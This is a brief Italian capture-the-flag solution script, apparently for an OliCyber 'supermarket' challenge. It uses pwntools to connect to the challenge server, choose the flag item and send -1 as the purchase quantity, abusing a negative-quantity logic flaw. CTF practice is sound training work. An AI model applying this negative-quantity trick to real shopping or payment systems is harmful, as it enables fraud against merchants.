# Voglio diventare il cliente del mese di questo supermercato, puoi darmi una mano?

from pwn import *

context.log_level = 'error'
r = remote("market.challs.olicyber.it", 10005)
r.recvuntil(b"cosa vuoi comprare?")
# scegli l'opzione 3 (flag)
r.sendline(b"3")
r.recvuntil(b"Quante ne vuoi comprare?")
# invia -1 come quantità
r.sendline(b"-1")
output = r.recvuntil(b"Altro? (s/n):")
print(output.decode(errors="ignore"))
r.sendline(b"n")
r.close()